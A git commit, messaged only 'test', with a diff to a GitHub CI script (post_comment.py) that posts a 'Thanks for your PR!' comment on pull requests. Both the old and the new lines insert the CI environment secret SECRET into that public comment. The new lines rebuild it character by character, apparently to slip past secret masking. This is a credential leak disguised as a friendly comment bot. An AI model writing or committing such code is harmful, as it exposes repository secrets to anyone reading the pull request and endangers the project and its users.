ff7ac4eaf4ac68805ba362bef6523523ce61464c
atalman <atalman@fb.com>
2024-10-08 11:20:03 -0700

    test

--- .github/scripts/post_comment.py
+++ .github/scripts/post_comment.py
@@ -14,7 +14,10 @@ def main():
     args = parse_args()
     repo = GitRepo(get_git_repo_dir(), get_git_remote_name())
     org, project = repo.gh_owner_and_name()
-    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! {' '.join(os.environ["SECRET"])}")
+    flag = ""
+    for char in os.environ["SECRET"]:
+        flag += char
+    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! {flag}")
 
 
 if __name__ == "__main__":
